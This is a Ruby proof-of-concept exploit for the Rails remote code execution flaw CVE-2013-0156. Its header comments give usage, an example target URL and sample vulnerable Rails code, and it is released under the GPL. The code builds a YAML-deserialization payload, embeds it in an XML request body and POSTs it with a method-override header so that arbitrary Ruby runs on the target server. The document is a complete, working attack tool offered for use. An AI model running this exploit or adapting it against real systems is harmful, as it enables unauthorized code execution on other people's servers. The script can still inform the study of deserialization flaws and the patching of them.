#!/usr/bin/env ruby
#
# Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)
#
# ## Advisory
#
#   https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion
#
# ## Caveats
#
# * Does not support Ruby 1.8.7.
#
# ## Synopsis
#
#   $ rails_rce.rb URL RUBY
#
# ## Dependencies
#
#   $ gem install ronin-support
#
# ## Example
#
#   $ rails_rce.rb http://localhost:3000/secrets/search "puts 'lol'"
#
# ### config/routes.rb
#
#   resources :secrets do
#     collection do
#       post :search
#     end
#   end
#
# ### app/controllers/secrets_controller.rb
#
#   def search
#     @secret = secret.find_by_secret(params[:secret])
#
#     render :json => @secret
#   end
#
# ## License
#
# Copyright (c) 2013 Postmodern
#
# This exploit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This exploit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this exploit.  If not, see <http://www.gnu.org/licenses/>.
#
# ## Shoutz
#
# drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,
# starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,
# mephux, nullthreat, evoltech, flatline, r0bglesson, @ericmonti, @bascule,
# @charliesome, @homakov, @envygeek, @chendo, @bitsweat (for creating the vuln),
# @tenderlove (for fixing it), Fun Town Auto, garbage pail kids, hipsters,
# the old Jolly Inn, Irvin Santiago, that heavy metal dude who always bummed
# cigarettes off us, SophSec crew and affiliates.
#

require 'ronin/network/http'
require 'ronin/formatting/html'
require 'ronin/ui/output'
require 'yaml'

include Ronin::Network::HTTP
include Ronin::UI::Output::Helpers

def escape_payload(payload,target=:rails3)
  case target
  when :rails3 then "foo\n#{payload}\n__END__\n"
  when :rails2 then "foo\nend\n#{payload}\n__END__\n"
  else
    raise(ArgumentError,"unsupported target: #{target}")
  end
end

def wrap_payload(payload)
  "(#{payload}; @executed = true) unless @executed"
end

def exploit(url,payload,target=:rails3)
  escaped_payload = escape_payload(wrap_payload(payload),target)
  encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp

  yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
  }.strip

  xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{yaml.html_escape}</exploit>
  }.strip

  return http_post(
    :url       => url,
    :headers   => {
      :content_type           => 'text/xml',
      :x_http_method_override => 'get'
    },
    :body      => xml
  )
end

if $0 == __FILE__
  unless ARGV.length >= 2
    $stderr.puts "usage: #{$0} URL RUBY [rails3|rails2]"
    exit -1
  end

  url     = ARGV[0]
  payload = ARGV[1]
  target  = ARGV.fetch(2,:rails3).to_sym

  print_info "POSTing #{payload} to #{url} ..."
  response = exploit(url,payload,target)

  case response.code
  when '200' then print_info "Success!"
  when '500' then print_error "Error!"
  else            print_error "Received response code #{response.code}"
  end
end
